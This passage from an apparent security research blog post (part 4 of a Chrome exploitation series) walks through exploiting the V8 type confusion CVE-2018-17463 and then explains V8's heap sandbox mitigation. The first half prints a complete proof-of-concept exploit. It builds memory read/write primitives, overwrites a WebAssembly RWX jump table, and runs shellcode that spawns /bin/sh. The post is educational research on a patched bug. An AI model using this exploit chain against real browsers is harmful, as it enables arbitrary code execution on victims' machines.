class="hljs-number">132</span>,<span class="hljs-number">128</span>,<span class="hljs-number">128</span>,<span class="hljs-number">128</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">65</span>,<span class="hljs-number">42</span>,<span class="hljs-number">11</span>]);<span class="hljs-keyword">var</span> wasmModule = <span class="hljs-keyword">new</span> WebAssembly.Module(wasmCode);<span class="hljs-keyword">var</span> wasmInstance = <span class="hljs-keyword">new</span> WebAssembly.Instance(wasmModule);<span class="hljs-keyword">var</span> func = wasmInstance.exports.main;</code></pre><h3 id="3-Leak-the-RWX-jump-table-pointer"><a href="#3-Leak-the-RWX-jump-table-pointer" class="headerlink" title="[3] Leak the RWX jump-table pointer"></a>[3] Leak the RWX jump-table pointer</h3><p>Using our primitive, obtain the wasm instance&#x2019;s address and the jump-table start pointer.</p><pre><code class="hljs jsx"><span class="hljs-comment">// Leak WebAssembly Instance Address and Jump Table Start Pointer</span>print(<span class="hljs-string">&quot;[+] Leaking WebAssembly Instance Address...&quot;</span>);<span class="hljs-keyword">let</span> wasmInstanceAddr = memory.addrOf(wasmInstance);print(<span class="hljs-string">`[+] WebAssembly Instance Address @ 0x<span class="hljs-subst">${wasmInstanceAddr.toString(<span class="hljs-number">16</span>)}</span>`</span>);<span class="hljs-keyword">let</span> wasmRWXAddr = memory.read64(wasmInstanceAddr + <span class="hljs-number">0xF0n</span>);print(<span class="hljs-string">`[+] WebAssembly RWX Jump Table Address @ 0x<span class="hljs-subst">${wasmRWXAddr.toString(<span class="hljs-number">16</span>)}</span>`</span>);</code></pre><h3 id="4-Inject-shellcode"><a href="#4-Inject-shellcode" class="headerlink" title="[4] Inject shellcode"></a>[4] Inject shellcode</h3><p>Read the jump-table pointer at offset <code>0xf0</code> from the <code>wasmInstance</code> object to obtain the RWX address. Use <code>read64</code> to get the executable address, then write your shellcode there.</p><pre><code class="hljs jsx"><span class="hljs-comment">// Leak WebAssembly Instance Address and Jump Table Start Pointer</span>print(<span class="hljs-string">&quot;[+] Leaking WebAssembly Instance Address...&quot;</span>);<span class="hljs-keyword">let</span> wasmInstanceAddr = memory.addrOf(wasmInstance);print(<span class="hljs-string">`[+] WebAssembly Instance Address @ 0x<span class="hljs-subst">${wasmInstanceAddr.toString(<span class="hljs-number">16</span>)}</span>`</span>);<span class="hljs-keyword">let</span> wasmRWXAddr = memory.read64(wasmInstanceAddr + <span class="hljs-number">0xF0n</span>);print(<span class="hljs-string">`[+] WebAssembly RWX Jump Table Address @ 0x<span class="hljs-subst">${wasmRWXAddr.toString(<span class="hljs-number">16</span>)}</span>`</span>);print(<span class="hljs-string">&quot;[+] Preparing Shellcode...&quot;</span>);<span class="hljs-comment">// Prepare Calc Shellcode</span><span class="hljs-keyword">let</span> shellcode = <span class="hljs-keyword">new</span> <span class="hljs-built_in">Uint8Array</span>([<span class="hljs-number">0x48</span>,...print(<span class="hljs-string">&quot;[+] Writing Shellcode to Jump Table Address...&quot;</span>);<span class="hljs-comment">// Write Shellcode to Jump Table Start Address</span>memory.write(wasmRWXAddr, shellcode);</code></pre><h3 id="5-Call-the-wasm-function-to-execute-the-shellcode"><a href="#5-Call-the-wasm-function-to-execute-the-shellcode" class="headerlink" title="[5] Call the wasm function to execute the shellcode"></a>[5] Call the wasm function to execute the shellcode</h3><p>Finally, call the wasm function (<code>main</code>). Since the jump table now points to our shellcode, invoking the function will execute it.</p><pre><code class="hljs jsx"><span class="hljs-comment">// Execute our Shellcode</span>print(<span class="hljs-string">&quot;[+] Popping Calc...&quot;</span>);func();</code></pre><p>This completes the chain from a JavaScript-initiated bug to native code execution.</p><p>Below is the final PoC reflecting the above steps.</p><blockquote><p>As mentioned in Part 1, these tests were performed on Linux. To port the PoC from Windows to Linux you only need to change the shellcode. I replaced the Windows calc shellcode with a shell-launching shellcode and executed it on Linux.</p></blockquote><pre><code class="hljs jsx"><span class="hljs-comment">// Conversion Buffers</span><span class="hljs-keyword">let</span> floatView = <span class="hljs-keyword">new</span> <span class="hljs-built_in">Float64Array</span>(<span class="hljs-number">1</span>);<span class="hljs-keyword">let</span> uint64View = <span class="hljs-keyword">new</span> BigUint64Array(floatView.buffer);<span class="hljs-built_in">Number</span>.prototype.toBigInt = <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">toBigInt</span>(<span class="hljs-params"></span>) </span>{    floatView[<span class="hljs-number">0</span>] = <span class="hljs-built_in">this</span>;    <span class="hljs-keyword">return</span> uint64View[<span class="hljs-number">0</span>];};BigInt.prototype.toNumber = <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">toNumber</span>(<span class="hljs-params"></span>) </span>{    uint64View[<span class="hljs-number">0</span>] = <span class="hljs-built_in">this</span>;    <span class="hljs-keyword">return</span> floatView[<span class="hljs-number">0</span>];};<span class="hljs-comment">// Function that creates an object with one in-line and 32 out-of-line properties</span><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">makeObj</span>(<span class="hljs-params">pValues</span>) </span>{    <span class="hljs-keyword">let</span> obj = {        inline: <span class="hljs-number">1234</span>    };    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">32</span>; i++) {        <span class="hljs-built_in">Object</span>.defineProperty(obj, <span class="hljs-string">&apos;p&apos;</span> + i, {            writable: <span class="hljs-literal">true</span>,            value: pValues[i]        });    }    <span class="hljs-keyword">return</span> obj;}<span class="hljs-comment">// Function to find overlapping properties</span><span class="hljs-keyword">let</span> p1, p2;<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">findOverlappingProperties</span>(<span class="hljs-params"></span>) </span>{    <span class="hljs-keyword">let</span> pNames = [];    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">32</span>; i++) {        pNames[i] = <span class="hljs-string">&apos;p&apos;</span> + i;    }    <span class="hljs-built_in">eval</span>(<span class="hljs-string">`</span><span class="hljs-string">        function vuln(obj) {</span><span class="hljs-string">            obj.inline;</span><span class="hljs-string">            this.Object.create(obj);</span><span class="hljs-string">            <span class="hljs-subst">${pNames.map((p) =&gt; <span class="hljs-string">`let <span class="hljs-subst">${p}</span> = obj.<span class="hljs-subst">${p}</span>;`</span>).join(<span class="hljs-string">&apos;\n&apos;</span>)}</span></span><span class="hljs-string">            return [<span class="hljs-subst">${pNames.join(<span class="hljs-string">&apos;, &apos;</span>)}</span>];</span><span class="hljs-string">        }</span><span class="hljs-string">    `</span>);    <span class="hljs-keyword">let</span> pValues = [];    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">1</span>; i &lt; <span class="hljs-number">32</span>; i++) {        pValues[i] = -i;    }    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">10000</span>; i++) {        <span class="hljs-keyword">let</span> res = vuln(makeObj(pValues));        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">1</span>; i &lt; res.length; i++) {            <span class="hljs-keyword">if</span> (i !== -res[i] &amp;&amp; res[i] &lt; <span class="hljs-number">0</span> &amp;&amp; res[i] &gt; <span class="hljs-number">-32</span>) {                [p1, p2] = [i, -res[i]];                <span class="hljs-keyword">return</span>;            }        }    }    <span class="hljs-keyword">throw</span> <span class="hljs-string">&quot;[!] Failed to find overlapping properties&quot;</span>;}<span class="hljs-comment">// Return address of an object as a BigInt</span><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">addrOf</span>(<span class="hljs-params">obj</span>) </span>{    <span class="hljs-built_in">eval</span>(<span class="hljs-string">`</span><span class="hljs-string">        function vuln(obj) {</span><span class="hljs-string">            obj.inline;</span><span class="hljs-string">            this.Object.create(obj);</span><span class="hljs-string">            return obj.p<span class="hljs-subst">${p1}</span>.x1;</span><span class="hljs-string">        }</span><span class="hljs-string">    `</span>);    <span class="hljs-keyword">let</span> pValues = [];    pValues[p1] = { <span class="hljs-attr">x1</span>: <span class="hljs-number">13.37</span>, <span class="hljs-attr">x2</span>: <span class="hljs-number">13.38</span> };    pValues[p2] = { <span class="hljs-attr">y</span>: obj };    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">10000</span>; i++) {        <span class="hljs-keyword">let</span> res = vuln(makeObj(pValues));        <span class="hljs-keyword">if</span> (res != <span class="hljs-number">13.37</span>) {            <span class="hljs-keyword">return</span> res.toBigInt() - <span class="hljs-number">1n</span>;        }    }    <span class="hljs-keyword">throw</span> <span class="hljs-string">&quot;[!] AddrOf Primitive Failed&quot;</span>;}<span class="hljs-comment">// Function to write data to obj address</span><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">fakeObj</span>(<span class="hljs-params">obj, newValue</span>) </span>{    <span class="hljs-built_in">eval</span>(<span class="hljs-string">`</span><span class="hljs-string">        function vuln(obj) {</span><span class="hljs-string">            obj.inline;</span><span class="hljs-string">            this.Object.create(obj);</span><span class="hljs-string">            let orig = obj.p<span class="hljs-subst">${p1}</span>.x2;</span><span class="hljs-string">            obj.p<span class="hljs-subst">${p1}</span>.x2 = <span class="hljs-subst">${newValue.toNumber()}</span>;</span><span class="hljs-string">            return orig;</span><span class="hljs-string">        }</span><span class="hljs-string">    `</span>);    <span class="hljs-keyword">let</span> pValues = [];    <span class="hljs-keyword">let</span> o = { <span class="hljs-attr">x1</span>: <span class="hljs-number">13.37</span>, <span class="hljs-attr">x2</span>: <span class="hljs-number">13.38</span> };    pValues[p1] = o;    pValues[p2] = obj;    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">10000</span>; i++) {        o.x2 = <span class="hljs-number">13.38</span>;        <span class="hljs-keyword">let</span> res = vuln(makeObj(pValues));        <span class="hljs-keyword">if</span> (res != <span class="hljs-number">13.38</span>) {            <span class="hljs-keyword">return</span> res.toBigInt();        }    }    <span class="hljs-keyword">throw</span> <span class="hljs-string">&quot;[!] fakeObj Primitive Failed&quot;</span>;}<span class="hljs-comment">// Find Overlapping Properties</span>print(<span class="hljs-string">&quot;[+] Finding Overlapping Properties...&quot;</span>);findOverlappingProperties();print(<span class="hljs-string">`[+] Properties p<span class="hljs-subst">${p1}</span> and p<span class="hljs-subst">${p2}</span> overlap!`</span>);<span class="hljs-comment">// Create Array Buffers</span><span class="hljs-keyword">let</span> arrBuf1 = <span class="hljs-keyword">new</span> <span class="hljs-built_in">ArrayBuffer</span>(<span class="hljs-number">1024</span>);<span class="hljs-keyword">let</span> arrBuf2 = <span class="hljs-keyword">new</span> <span class="hljs-built_in">ArrayBuffer</span>(<span class="hljs-number">1024</span>);<span class="hljs-comment">// Leak Address of arrBuf2</span>print(<span class="hljs-string">&quot;[+] Leaking ArrayBuffer Address...&quot;</span>);<span class="hljs-keyword">let</span> arrBuf2Addr = addrOf(arrBuf2);print(<span class="hljs-string">`[+] ArrayBuffer Address @ 0x<span class="hljs-subst">${arrBuf2Addr.toString(<span class="hljs-number">16</span>)}</span>`</span>);<span class="hljs-comment">// Corrupt Backing Store Pointer of arrBuf1</span>print(<span class="hljs-string">&quot;[+] Corrupting ArrayBuffer Backing Store...&quot;</span>);<span class="hljs-keyword">let</span> originalArrBuf1BackingStore = fakeObj(arrBuf1, arrBuf2Addr);<span class="hljs-comment">// Store Original Backing Store Pointer of arrBuf2</span><span class="hljs-keyword">let</span> view1 = <span class="hljs-keyword">new</span> BigUint64Array(arrBuf1);<span class="hljs-keyword">let</span> originalArrBuf2BackingStore = view1[<span class="hljs-number">4</span>];<span class="hljs-comment">// Memory Read and Write Primitives</span><span class="hljs-keyword">let</span> memory = {    write(addr, bytes) {        view1[<span class="hljs-number">4</span>] = addr;        <span class="hljs-keyword">let</span> view2 = <span class="hljs-keyword">new</span> <span class="hljs-built_in">Uint8Array</span>(arrBuf2);        view2.set(bytes);    },    read64(addr) {        view1[<span class="hljs-number">4</span>] = addr;        <span class="hljs-keyword">let</span> view2 = <span class="hljs-keyword">new</span> BigUint64Array(arrBuf2);        <span class="hljs-keyword">return</span> view2[<span class="hljs-number">0</span>];    },    write64(addr, ptr) {        view1[<span class="hljs-number">4</span>] = addr;        <span class="hljs-keyword">let</span> view2 = <span class="hljs-keyword">new</span> BigUint64Array(arrBuf2);        view2[<span class="hljs-number">0</span>] = ptr;    },    addrOf(obj) {        arrBuf2.leakMe = obj;        <span class="hljs-keyword">let</span> props = <span class="hljs-built_in">this</span>.read64(arrBuf2Addr + <span class="hljs-number">8n</span>) - <span class="hljs-number">1n</span>;        <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>.read64(props + <span class="hljs-number">16n</span>) - <span class="hljs-number">1n</span>;    }};print(<span class="hljs-string">&quot;[+] Constructed Memory Read and Write Primitive!&quot;</span>);<span class="hljs-comment">// Generate RWX region via WASM</span>print(<span class="hljs-string">&quot;[+] Generating a WebAssembly Instance...&quot;</span>);<span class="hljs-keyword">var</span> wasmCode = <span class="hljs-keyword">new</span> <span class="hljs-built_in">Uint8Array</span>([<span class="hljs-number">0</span>, <span class="hljs-number">97</span>, <span class="hljs-number">115</span>, <span class="hljs-number">109</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">133</span>, <span class="hljs-number">128</span>, <span class="hljs-number">128</span>, <span class="hljs-number">128</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">96</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">127</span>, <span class="hljs-number">3</span>, <span class="hljs-number">130</span>, <span class="hljs-number">128</span>, <span class="hljs-number">128</span>, <span class="hljs-number">128</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">4</span>, <span class="hljs-number">132</span>, <span class="hljs-number">128</span>, <span class="hljs-number">128</span>, <span class="hljs-number">128</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">112</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">5</span>, <span class="hljs-number">131</span>, <span class="hljs-number">128</span>, <span class="hljs-number">128</span>, <span class="hljs-number">128</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">6</span>, <span class="hljs-number">129</span>, <span class="hljs-number">128</span>, <span class="hljs-number">128</span>, <span class="hljs-number">128</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">7</span>, <span class="hljs-number">145</span>, <span class="hljs-number">128</span>, <span class="hljs-number">128</span>, <span class="hljs-number">128</span>, <span class="hljs-number">0</span>, <span class="hljs-number">2</span>, <span class="hljs-number">6</span>, <span class="hljs-number">109</span>, <span class="hljs-number">101</span>, <span class="hljs-number">109</span>, <span class="hljs-number">111</span>, <span class="hljs-number">114</span>, <span class="hljs-number">121</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0</span>, <span class="hljs-number">4</span>, <span class="hljs-number">109</span>, <span class="hljs-number">97</span>, <span class="hljs-number">105</span>, <span class="hljs-number">110</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">10</span>, <span class="hljs-number">138</span>, <span class="hljs-number">128</span>, <span class="hljs-number">128</span>, <span class="hljs-number">128</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">132</span>, <span class="hljs-number">128</span>, <span class="hljs-number">128</span>, <span class="hljs-number">128</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">65</span>, <span class="hljs-number">42</span>, <span class="hljs-number">11</span>]);<span class="hljs-keyword">var</span> wasmModule = <span class="hljs-keyword">new</span> WebAssembly.Module(wasmCode);<span class="hljs-keyword">var</span> wasmInstance = <span class="hljs-keyword">new</span> WebAssembly.Instance(wasmModule);<span class="hljs-keyword">var</span> func = wasmInstance.exports.main;<span class="hljs-comment">// Leak WebAssembly Instance Address and Jump Table</span>print(<span class="hljs-string">&quot;[+] Leaking WebAssembly Instance Address...&quot;</span>);<span class="hljs-keyword">let</span> wasmInstanceAddr = memory.addrOf(wasmInstance);print(<span class="hljs-string">`[+] WebAssembly Instance Address @ 0x<span class="hljs-subst">${wasmInstanceAddr.toString(<span class="hljs-number">16</span>)}</span>`</span>);<span class="hljs-keyword">let</span> wasmRWXAddr = memory.read64(wasmInstanceAddr + <span class="hljs-number">0xF0n</span>);print(<span class="hljs-string">`[+] WebAssembly RWX Jump Table Address @ 0x<span class="hljs-subst">${wasmRWXAddr.toString(<span class="hljs-number">16</span>)}</span>`</span>);print(<span class="hljs-string">&quot;[+] Preparing Shellcode...&quot;</span>);<span class="hljs-comment">// Linux x64 Shellcode to execute /bin/sh</span><span class="hljs-keyword">let</span> shellcode = <span class="hljs-keyword">new</span> <span class="hljs-built_in">Uint8Array</span>([    <span class="hljs-number">0x6a</span>, <span class="hljs-number">0x3b</span>,                   <span class="hljs-comment">// push 59 (syscall number for execve)</span>    <span class="hljs-number">0x58</span>,                         <span class="hljs-comment">// pop rax</span>    <span class="hljs-number">0x48</span>, <span class="hljs-number">0x31</span>, <span class="hljs-number">0xd2</span>,            <span class="hljs-comment">// xor rdx, rdx (envp = NULL)</span>    <span class="hljs-number">0x48</span>, <span class="hljs-number">0x31</span>, <span class="hljs-number">0xf6</span>,            <span class="hljs-comment">// xor rsi, rsi (argv = NULL)</span>    <span class="hljs-number">0x48</span>, <span class="hljs-number">0xbf</span>, <span class="hljs-number">0x2f</span>, <span class="hljs-number">0x62</span>, <span class="hljs-number">0x69</span>, <span class="hljs-number">0x6e</span>, <span class="hljs-number">0x2f</span>, <span class="hljs-number">0x73</span>, <span class="hljs-number">0x68</span>, <span class="hljs-number">0x00</span>, <span class="hljs-comment">// movabs rdi, &quot;/bin/sh\x00&quot;</span>    <span class="hljs-number">0x57</span>,                         <span class="hljs-comment">// push rdi</span>    <span class="hljs-number">0x48</span>, <span class="hljs-number">0x89</span>, <span class="hljs-number">0xe7</span>,            <span class="hljs-comment">// mov rdi, rsp</span>    <span class="hljs-number">0x0f</span>, <span class="hljs-number">0x05</span>                    <span class="hljs-comment">// syscall</span>]);print(<span class="hljs-string">&quot;[+] Writing Shellcode to Jump Table Address...&quot;</span>);<span class="hljs-comment">// Write Shellcode</span>memory.write(wasmRWXAddr, shellcode);print(<span class="hljs-string">&quot;[+] Spawning Shell...&quot;</span>);<span class="hljs-comment">// Execute Shellcode</span>func();</code></pre><h3 id="Result"><a href="#Result" class="headerlink" title="Result"></a>Result</h3><p>Because this exploit writes shellcode into a wasm instance&#x2019;s jump table in memory, porting the payload to Linux involved only changing the shellcode. I replaced the calc payload with a shell spawner and ran it successfully on Linux.</p><ul><li>Windows</li></ul><p><img src="image%203.png" alt="image.png"></p><ul><li>Linux</li></ul><p><img src="image%204.png" alt="image.png"></p><h2 id="1-4-Summary"><a href="#1-4-Summary" class="headerlink" title="1.4 Summary"></a>1.4 Summary</h2><p>We&#x2019;ve now made it to Part 4, and since it&#x2019;s been quite a long journey, let&#x2019;s take a moment to summarize before moving on! (There&#x2019;s still more ahead &#x1F60E;)</p><p>In <strong>Part 1</strong>, we covered the foundational concepts necessary to understand Chrome&#x2019;s internal architecture and the V8 engine.</p><p>In <strong>Part 2</strong>, we discussed the concept of <strong>Type Confusion</strong> &#x2014; why it happens when the JavaScript engine misinterprets internal types, and what security risks it introduces.</p><p>In <strong>Parts 3 through 4 (so far)</strong>, we took a deep dive into how Type Confusion can be leveraged to build <strong>read/write primitives</strong>, and how those primitives evolve into a <strong>full exploit chain</strong>.</p><p>Modern browsers operate using multiple processes and complex memory structures to support their wide range of features. This architecture gives attackers numerous potential vectors to target, and by chaining those vectors together, they can gain the ability to read or write arbitrary data in the heap.</p><p>This research post focused on one such vector &#x2014; <strong>Type Confusion</strong> &#x2014; showing how it can be exploited to manipulate memory and ultimately achieve <strong>remote code execution (RCE)</strong>.</p><p>From a technical standpoint, the exploit for <strong>CVE-2018-17463</strong> can be thought of as consisting of two major phases:</p><ol><li><strong>Vulnerability &#x2192; Primitive Construction Phase:</strong><br>This phase involves analyzing the Type Confusion bug and crafting reliable <strong>memory read/write primitives</strong>. It&#x2019;s primarily about understanding the root cause of the bug and the inner workings of the JavaScript engine.</li><li><strong>Primitive &#x2192; Code Execution (Weaponization / Pwn) Phase:</strong><br>In this phase, the attacker uses the acquired primitives to target <strong>executable memory (RWX)</strong> and run arbitrary code. This step belongs more to the traditional <strong>pwnable/exploit engineering</strong> domain.</li></ol><p>In other words, when viewed through the lens of <strong>CVE-2018-17463</strong>, everything up to the creation of the memory read/write primitives belongs to <strong>vulnerability and engine-level research</strong>, while overwriting the <strong>Wasm instance jump table</strong> to trigger actual RCE falls under <strong>pwnable exploitation</strong>.</p><p>Now, if you&#x2019;ve studied pwnable before, you might already know what usually follows such an exploit&#x2026;</p><p>That&#x2019;s right &#x2014; <strong>mitigation</strong>&#x1F62D;</p><p><del>(As someone studying vulnerabilities, I can&#x2019;t decide whether to laugh or cry &#x1F602;)</del></p><p>In V8, optimizations that occur independently of the developer&#x2019;s intentions can often lead to bugs like Type Confusion. Because this happened far too frequently, <strong>V8 introduced a new mitigation called the Heap Sandbox in early 2020</strong>.</p><p>Let&#x2019;s continue and explore what <strong>Heap Sandbox</strong> is, and how it mitigates these attacks! &#x314E;.&#x314E;</p><h1 id="2-V8-Heap-Sandbox"><a href="#2-V8-Heap-Sandbox" class="headerlink" title="2. V8 Heap Sandbox"></a>2. V8 Heap Sandbox</h1><p>In Chapter 2, &#x201C;sandbox&#x201D; doesn&#x2019;t mean Chrome&#x2019;s process sandbox but rather the heap sandbox inside the renderer &#x2014; i.e., the V8 heap sandbox.</p><h2 id="2-1-Motivation"><a href="#2-1-Motivation" class="headerlink" title="2.1 Motivation"></a>2.1 Motivation</h2><p><img src="image%205.png" alt="image.png"></p><p>For several years before the sandbox, over 60% of Chrome exploits started in V8, but many of those weren&#x2019;t classic memory bugs (UAF, OOB). They were subtle logical bugs in the JIT compiler or runtime &#x2014; or memory corruptions caused by such logic bugs. These aren&#x2019;t problems you can eliminate just by writing &#x201C;better&#x201D; code, because the compiler itself becomes an attack surface. V8 therefore needed a tailored defensive layer that prevents memory corruption in the heap from immediately compromising the rest of the process &#x2014; that is the core goal of the <strong>V8 Heap Sandbox</strong>.</p><p>Put it simply, the goal is to ensure that <strong>even if a vulnerability causes an arbitrary value (especially a pointer) to be written, that value cannot immediately take over the engine&#x2019;s control flow</strong>. Like any security feature, the sandbox must keep overhead low. To achieve this, the Heap Sandbox generally follows these conceptual strategies:</p><ul><li><strong>Memory partitioning / isolation:</strong> separate the engine heap memory (and related structures) from other runtime memory (host address space, JIT code pages, etc.) so that a heap value cannot directly translate into an external executable address.</li><li><strong>Pointer encapsulation &amp; validation:</strong> encode (tag) pointer representations stored on the heap or validate pointers before they are used, preventing heap values from being mixed directly with host addresses.</li><li><strong>Restricted dereferencing / bounds checks:</strong> strictly distinguish whether a heap value is an executable code address and prevent interpreting arbitrary data as function pointers.</li></ul><p>Overall, V8&#x2019;s sandbox design focuses on protecting the rest of the process under the assumption that an attacker may be able to corrupt heap memory.</p><h2 id="2-2-Implementation"><a href="#2-2-Implementation" class="headerlink" title="2.2 Implementation"></a>2.2 Implementation</h2><p>The key idea in the sandbox design is to change how V8 dereferences addresses: instead of doing direct pointer arithmetic inside the engine, treat heap <strong>references as offsets/indices</strong>. This prevents raw heap values from becoming host addresses or executable pointers, and lets the runtime control pointer usage tightly. The high-level concept can be broken down as follows.</p><p><img src="image%206.png" alt="image.png"></p><p>This concept can be divided into &#x201C;sandbox address-space allocation / handling of pointers inside &amp; outside the sandbox / trusted space,&#x201D; and we&#x2019;ll take a closer look at each of those in detail.</p><h3 id="1-Sandbox-Address-Space"><a href="#1-Sandbox-Address-Space" class="headerlink" title="1. Sandbox Address Space"></a>1. Sandbox Address Space</h3><p>The sandbox reserves a <strong>large virtual address space</strong> that contains the memory V8 directly touches (engine heap, ArrayBuffer backing stores, Wasm memory, etc.). This space is reserved in virtual address space (potentially terabytes) and treated as the &#x201C;sandbox.&#x201D; Generous guard regions surround the sandbox to prevent out-of-bounds sandbox indices from escaping into the host address space, both logically and physically.</p><p><img src="image%207.png" alt="image.png"></p><h3 id="2-Sandboxed-Pointers-pointers-inside-the-sandbox"><a href="#2-Sandboxed-Pointers-pointers-inside-the-sandbox" class="headerlink" title="2. Sandboxed Pointers (pointers inside the sandbox )"></a>2. Sandboxed Pointers (pointers inside the sandbox )</h3><p>References inside the sandbox are represented not as raw physical addresses but as <strong>offsets from the sandbox base</strong>. A SandboxedPointer uses a fixed-width offset (for example, 40 bits) relative to the sandbox base, so even if the offset value is corrupted, the resulting address remains inside the sandbox. Security-wise this blocks arbitrary access outside the sandbox; performance-wise it&#x2019;s efficient because the sandbox base can be cached in a CPU register and offset&#x2192;address conversion on x86-64 requires only two extra instructions (and one on ARM64).</p><h3 id="3-Pointer-Tables-pointers-outside-the-sandbox"><a href="#3-Pointer-Tables-pointers-outside-the-sandbox" class="headerlink" title="3. Pointer Tables (pointers outside the sandbox )"></a>3. Pointer Tables (pointers outside the sandbox )</h3><p>Objects outside the sandbox (e.g., DOM nodes, external extension objects) are not referenced directly from within the sandbox. Instead, the sandbox stores <strong>indices into a pointer table</strong>. Sandboxed objects hold a table index rather than the external pointer itself; at runtime the sandbox resolves that index to an external pointer. This improves safety: spatial safety is enforced by bounds-checking table indices; temporal safety is improved because GC can manage and reclaim table entries. Table entries can also include <strong>type tags</strong> so that when a pointer is loaded it can be validated against an expected type &#x2014; helping prevent Type Confusion attacks.</p><p><img src="image%208.png" alt="image.png"></p><h3 id="4-Trusted-Space"><a href="#4-Trusted-Space" class="headerlink" title="4. Trusted Space"></a>4. Trusted Space</h3><p>Certain internal V8 objects (for example, bytecode arrays, deoptimization data) are difficult to protect solely with the sandbox or could be risky if mishandled. V8 therefore puts especially sensitive objects into a separate <strong>trusted heap area</strong> outside the sandbox. This trusted area has its own pointer-compression cage and is accessed from the sandbox via an indirection mechanism (e.g., a Trusted Pointer Table). As a result, even if an attacker corrupts data inside the sandbox, the chances of directly manipulating sensitive trusted objects are greatly reduced.</p><p><img src="image%209.png" alt="image.png"></p><h3 id="Summary"><a href="#Summary" class="headerlink" title="Summary"></a>Summary</h3><p>In short, the sandbox architecture: (1) isolates the heap into a large virtual address region, (2) represents pointers inside the sandbox as safe offsets, (3) uses index-based tables for references to outside-the-sandbox objects, and (4) isolates especially sensitive objects into a trusted space. This multi-layered approach effectively blocks heap-based vulnerabilities from immediately turning into execution control compromises.</p><p><img src="image%2010.png" alt="image.png"></p><h1 id="Outro"><a href="#Outro" class="headerlink" title="Outro"></a>Outro</h1><p>Before the sandbox, simply overwriting a heap pointer so that a <code>TypedArray</code>&#x2019;s <code>backing_store</code> pointed at attacker-chosen memory was often enough to get arbitrary read/write (AAR/AAW) across process memory.</p><p>With the sandbox, the difficulty of Chrome exploitation increased dramatically. The most direct effect is that pointer overwrite attacks are harder: the sandbox stops simple pointer casting or ensures that a corrupted value won&#x2019;t be treated as a valid execution pointer. As a result, achieving a renderer-process RCE from a single vulnerability typically requires a <strong>sandbox escape</strong>.</p><p>But raising the difficulty only goes so far &#x2014; if you can escape the sandbox&#x2026;?</p><p><img src="image%2011.jpg" alt="image.jpg"></p><p>In the next post I&#x2019;ll cover how renderer RCE is achieved after the sandbox was introduced.</p><p>See you next time! &#x1F64C;</p><h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><p><a href="https://jhalon.github.io/chrome-browser-exploitation-3/">https://jhalon.github.io/chrome-browser-exploitation-3/</a></p><p><a href="https://v8.dev/blog/sandbox">https://v8.dev/blog/sandbox</a></p><p><a href="https://docs.google.com/document/d/1FM4fQmIhEqPG8uGp5o9A-mnPB5BOeScZYpkHjo0KKA8/">https://docs.google.com/document/d/1FM4fQmIhEqPG8uGp5o9A-mnPB5BOeScZYpkHjo0KKA8/</a></p><p><a href="https://saelo.github.io/presentations/offensivecon_24_the_v8_heap_sandbox.pdf">https://saelo.github.io/presentations/offensivecon_24_the_v8_heap_sandbox.pdf</a></p><p><a href="https://m.blog.naver.com/funraon/223669595583">https://m.blog.naver.com/funraon/223669595583</a></p>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/Research/">Research</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/RCE/">RCE</category>
      
      <category domain="https://hackyboiz.github.io/tags/OUYA77/">OUYA77</category>
      
      <category domain="https://hackyboiz.github.io/tags/pwnable/">pwnable</category>
      
      <category domain="https://hackyboiz.github.io/tags/Type-Confusion/">Type Confusion</category>
      
      <category domain="https://hackyboiz.github.io/tags/Chrome/">Chrome</category>
      
      <category domain="https://hackyboiz.github.io/tags/Chromium/">Chromium</category>
      
      <category domain="https://hackyboiz.github.io/tags/CVE-2018-17463/">CVE-2018-17463</category>
      
      <category domain="https://hackyboiz.github.io/tags/Heap-Sandbox/">Heap Sandbox</category>
      
      
      <comments>https://hackyboiz.github.io/2025/10/10/OUYA77/Chrome_part4/en/#disqus_thread</comments>
      
    </item>
    
  </channel>
</rss>
